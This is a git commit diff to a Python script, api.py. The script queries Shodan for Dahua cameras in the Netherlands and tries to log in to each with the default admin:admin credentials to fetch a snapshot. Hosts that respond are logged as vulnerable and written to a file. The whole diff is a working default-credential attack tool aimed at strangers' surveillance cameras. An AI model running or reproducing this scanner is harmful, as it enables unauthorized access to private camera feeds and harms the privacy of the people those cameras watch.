09e35cbda7014a0119705beb4d8b62ea3910cba0
Alec <alec@siemerink.org>
2020-04-08 22:22:18 +0200

    Working v1.0

--- api.py
+++ api.py
@@ -7,24 +7,27 @@ api = shodan.Shodan(SHODAN_API_KEY)
 client = MongoClient(mongodb_key)
 db = client.addresses
 
+iplist = []
+vulnlist = []
 
-def getaddresses():
-    limit = 1
+
+# Gets available Dahua Hosts in given country
+def getaddresses(amount):
+    limit = amount
     counter = 0
-    iplist = []
     for banner in api.search_cursor('Dahua country:NL'):
         ip = str(banner['ip_str'])
-        city = str(banner['location'])
+        print(ip)
+        # city = str(banner['location'])
         iplist.append(ip)
-        # Keep track of how many results have been downloaded so we don't use up all our query credits
         counter += 1
         if counter >= limit:
             break
-    return ip
-    return city
     return iplist
 
 
+# Generates link to which the request is sent, asking for a snapshot of first available channel using standard login
+# credentials.
 def linkbuilder(iplist):
     linklist = []
     for ip in iplist:
@@ -33,23 +36,39 @@ def linkbuilder(iplist):
     return linklist
 
 
-def request(linklist, iplist, city, ip):
-    vulnlist = []
-    for link in linklist:
-        print link
-        try:
-            response = requests.get(link, verify=False, timeout=3)
-            if response.status_code == 200:
-                vulnlist.append(iplist[linklist.index(link)])
-                addresses = {
-                    'number: ': vulnlist.len(),
-                    'location: ': city,
-                    'ip: ': ip
-                }
-        except:
-            pass
-    print addresses
+# Makes request call to Dahua Product API, asking for a snapshot of first channel available
+# If request is succesfull (HTML code 200), True is returned for vulnerable with standard login credentials.
+def request(link):
+    try:
+        response = requests.get(link, verify=False, timeout=3)
+        if response.status_code == 200:
+            # vulnlist.append(iplist[linklist.index(link)])
+            return True
+    except:
+        return False
+        pass
+
+
+def run(amount):
+    getaddresses(amount)
+    for ip in iplist:
+        link = 'http://admin:admin@' + ip + '/cgi-bin/snapshot.cgi'
+        print("trying: " + link)
+        if request(link):
+            print('Succes!')
+            vulnlist.append(ip)
+        else:
+            print("Fail!")
+    print("Vulnerable IP's:")
     return vulnlist
 
 
-print(request(linkbuilder(getaddresses()), getaddresses()))
+def save():
+    with open('./list.txt', 'w') as filehandle:
+        for vuln in vulnlist:
+            print('writing to file')
+            filehandle.write('%s\n' % vuln)
+
+
+print(run(150))
+print(save())
